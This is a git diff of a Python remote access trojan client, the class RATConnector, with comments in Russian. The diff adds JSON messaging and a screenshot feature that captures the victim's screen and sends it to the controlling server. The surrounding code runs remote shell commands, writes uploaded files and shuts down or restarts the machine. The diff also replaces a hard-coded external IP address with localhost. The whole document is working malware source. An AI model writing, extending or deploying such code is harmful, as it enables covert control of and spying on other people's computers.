@@ -6,10 +6,32 @@ import os
 import base64
 import ctypes
 import sys
-
+import pyautogui
+import PIL
 
 
 class RATConnector:
+
+    # Отправляем json данные серверу
+    def send_json(self, data):
+        # Если данные окажутся строкой
+        try:
+            json_data = json.dumps(data.decode('utf-8'))
+        except:
+            json_data = json.dumps(data) 
+        self.connection.send(json_data.encode('utf-8'))
+
+
+
+    # Получаем json данные от сервера
+    def receive_json(self):
+        json_data = ''
+        while True:
+            try:
+                json_data += self.connection.recv(1024).decode('utf-8')
+                return json.loads(json_data)
+            except ValueError:
+                pass
 
     def __init__(self, ip, port):
         # Try to connect to the server, if failed wait five seconds and try again.
@@ -62,10 +84,18 @@ class RATConnector:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Upload complete"
+    
+    # Обработать изображение с экрана
+    def screen_handler(self):
+        pyautogui.screenshot('1.png')
+        with open('1.png', 'rb') as file:
+            reader = base64.b64encode(file.read())
+        os.remove('1.png')
+        return reader
 
     def run(self):
         while True:
-            command = self.dataReceive()
+            command = self.receive_json()
             try:
                 if command[0] == "exit":
                     self.connection.close()
@@ -93,6 +123,9 @@ class RATConnector:
                     os.system("shutdown /s /t 1")
                 elif command[0] == "restart":
                     os.system("shutdown /r /t 1")
+                elif command[0] == "screenshot":
+                    commandResponse = self.screen_handler()
+
                 else:
                     convCommand = self.arrayToString(command)
                     commandResponse = self.runCommand(convCommand).decode()
@@ -101,9 +134,9 @@ class RATConnector:
                 commandResponse = (
                     f"[-] Error running command: {e}"
                 )
-            self.dataSend(commandResponse)
+            self.send_json(commandResponse)
 
 
 print("run")
-ratClient = RATConnector("185.173.93.219", 8080)
+ratClient = RATConnector("127.0.0.1", 8080)
 ratClient.run()
